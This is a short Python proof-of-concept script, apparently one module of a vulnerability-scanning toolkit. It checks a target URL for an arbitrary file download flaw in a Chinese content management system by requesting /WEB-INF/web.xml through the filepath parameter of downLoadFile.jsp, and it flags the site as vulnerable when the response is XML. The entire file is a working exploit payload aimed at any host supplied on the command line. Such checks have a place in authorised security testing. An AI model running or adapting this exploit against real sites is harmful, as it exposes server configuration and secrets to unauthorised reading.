#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金宇恒内容管理系统通用型任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-069009
author: Lucifer
description: 文件/adminroot/common/downLoadFile.jsp中,参数filepath存在任意文件下载。
'''
import sys
import requests
import warnings
from termcolor import cprint

class gevercms_downLoadFile_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/adminroot/common/downLoadFile.jsp?filepath=/WEB-INF/web.xml&filename=None"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                cprint("[+]存在金宇恒内容管理系统通用型任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = gevercms_downLoadFile_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()